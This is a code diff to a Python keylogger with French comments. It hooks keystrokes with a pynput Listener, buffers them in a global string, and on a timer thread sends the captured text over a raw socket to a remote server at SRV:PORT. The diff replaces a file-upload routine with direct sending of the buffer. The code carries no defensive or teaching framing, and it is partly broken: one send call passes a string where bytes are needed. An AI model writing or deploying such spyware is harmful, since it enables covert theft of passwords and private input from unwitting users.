@@ -16,19 +16,8 @@ def argument():
 
 
 
-TXT_GLOB = ""
+TXT_GLOB = "ho"
 
-
-####connection avec le serveur
-
-## Thread 1
-# activation du script
-# Lancement d'une requette au srv
-
-# toutes les X frappes de clavier - Refresh renvoi au srv
-
-##Thread 2
-# Ecouter serveur
 
 def kpr(key):
         global TXT_GLOB
@@ -45,9 +34,10 @@ def chrono():
             print(f"Secondes : {seconds}")
             seconds += 1
             time.sleep(1)
-            if seconds == seconds % 10 :
+            if seconds == 10 :
                 send_t = threading.Thread(target=send)
                 send_t.start()
+                print(TXT_GLOB)
 def keylogger():
     with Listener(on_press=kpr) as listener:
         listener.join()
@@ -60,30 +50,15 @@ def send():
 
     client_socket.connect((SRV, PORT))
 
+    message = TXT_GLOB
 
-    #client_socket.send(message.encode('utf-8')) ##envoi
-    keylog_fichier = "keylog.txt"
+    client_socket.send(message.encode('utf-8')) ##envoi
 
-    client_socket.send( keylog_fichier.encode('utf-8'))  # envoie fichier
+    client_socket.send(TXT_GLOB) # envoie fichier
 
-
-    with open("keylog.txt", "r") as f:
-        with open(keylog_fichier, 'rb') as file:
-            while True:
-                data = file.read(1024)
-                if not data:
-                    break
-                client_socket.send(data)
-
-        response = client_socket.recv(1024) ### 124 taille du message en octet
-        print(f"Réponse du serveur : {response.decode('utf-8')}")
-
-        client_socket.close()
-
-        print(f"Le fichier '{keylog_fichier}' a été envoyé avec succès.")
-
-    # Fermez la connexion
     client_socket.close()
+
+
 
 
 chrono_t = threading.Thread(target=chrono)
